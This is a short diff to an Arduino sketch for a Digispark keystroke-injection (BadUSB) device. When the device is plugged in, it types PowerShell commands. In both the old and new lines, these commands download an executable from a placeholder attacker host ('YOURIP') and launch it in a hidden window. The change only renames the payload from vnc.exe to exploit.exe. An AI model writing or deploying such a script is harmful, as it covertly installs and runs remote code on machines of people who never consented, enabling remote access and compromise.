@@ -51,11 +51,11 @@ pisca_led(100);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("Invoke-WebRequest -Uri http://YOURIP/vnc.exe -OutFile vnc.exe");
+  DigiKeyboard.println("Invoke-WebRequest -Uri http://YOURIP/exploit.exe -OutFile exploit.exe");
   DigiKeyboard.delay(700);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
-  DigiKeyboard.println("powershell -windowstyle hidden start ./vnc.exe");
+  DigiKeyboard.println("powershell -windowstyle hidden start ./exploit.exe");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //
